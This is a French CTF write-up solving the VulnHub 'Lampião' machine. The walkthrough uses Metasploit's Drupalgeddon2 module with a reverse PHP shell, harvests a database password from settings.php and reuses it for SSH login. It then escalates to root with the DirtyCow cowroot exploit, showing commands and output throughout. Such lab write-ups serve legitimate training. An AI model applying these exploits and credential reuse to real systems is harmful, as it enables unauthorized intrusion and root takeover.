---
title: "Solution du CTF Lampião de VulnHub"
tags: [CTF, VulnHub]
---

[Lampião](https://www.vulnhub.com/entry/lampiao-1,249/) est un CTF cré par *Tiago Tavares* et disponible sur *VulnHub*.

Un scan de port remonte 3 services écoutants sur les ports 22, 80 et 1898.

Il apparait assez vite que le port 80 a un fonctionnement bizarre. On ne peut par exemple pas faire une énumération dessus.

Problème de montée en charge ? En fait le port retourne un contenu ascii brut sans entêtes HTTP. Les navigateurs récupèrent et affichent tout de même la réponse, mais via les dev-tools on peut voire que les entêtes de réponse sont manquants.

Le dernier port est celui qui nous intéresse :

```
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

On trouve dessus un `Drupal 7`. J'ai essayé quelques exploits simples sur *exploit-db* sans réussite. Je suis donc passé à *Metasploit* depuis *Kali Linux*.

Le module suivant a fonctionné :

```
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.56.169   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        1898             yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.79    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.56.79:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Command shell session 1 opened (192.168.56.79:4444 -> 192.168.56.169:43830) at 2023-04-10 18:13:12 +0200
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Petit aparté : quand un module ne fonctionne pas vous pouvez activer le débogage pour déterminer ce qui ne passe pas ou utiliser un payload différent.

Avec le shell obtenu je peux lire la configuration du Drupal présente dans le fichier `/var/www/html/sites/default/settings.php` :

```php
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'Virgulino',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```

Je teste vite le mot de passe `Virgulino` pour le compte local unix `tiago` et ça fonctionne.

Ne trouvant rien de bien intéressant sur le système, j'utilise `pspy` pour monitorer les processus. Je remarque cette entrée :

```
2023/04/10 15:36:51 CMD: UID=0    PID=600    | awk {print $2} 
2023/04/10 15:36:51 CMD: UID=0    PID=599    | grep -v grep 
2023/04/10 15:36:51 CMD: UID=0    PID=598    | grep nc -lk 80 
2023/04/10 15:36:51 CMD: UID=0    PID=597    | ps aux 
2023/04/10 15:36:51 CMD: UID=0    PID=596    | /bin/bash /etc/cangaco/lampiao.sh
```

Malheureusement aucun des fichiers dans `/etc/cangaco/` ne m'est accessible.

Finalement j'ai regardé les exploits kernel suggérés par `LinPEAS`. Une bonne partie concerne l'architecture x86_64 mais le système est vulnérable à DirtyCow.

J'ai d'abord testé l'exploit habituel (`dirty.c`) mais ce dernier causait un kernel panic. L'exploit `cowroot.c` fonctionne correctement, il faut seulement penser à commenter la partie 64 bits et décommenter la partie 32 bits.

```console
tiago@lampiao:~$ gcc -o cowroot cowroot.c -lpthread
cowroot.c: In function ‘procselfmemThread’:
cowroot.c:96:9: warning: passing argument 2 of ‘lseek’ makes integer from pointer without a cast [enabled by default]
         lseek(f,map,SEEK_SET);
         ^
In file included from cowroot.c:27:0:
/usr/include/unistd.h:334:16: note: expected ‘__off_t’ but argument is of type ‘void *’
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
cowroot.c: In function ‘main’:
cowroot.c:139:5: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘__off_t’ [-Wformat=]
     printf("Size of binary: %d\n", st.st_size);
     ^
tiago@lampiao:~$ ./cowroot 
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 45420
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@lampiao:/home/tiago# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@lampiao:/home/tiago# id
uid=0(root) gid=1000(tiago) groups=0(root),1000(tiago)
root@lampiao:/home/tiago# cd /root
root@lampiao:/root# ls
flag.txt
root@lampiao:/root# cat flag.txt
9740616875908d91ddcdaa8aea3af366
```

Il s'est avéré que c'était la solution attendue.
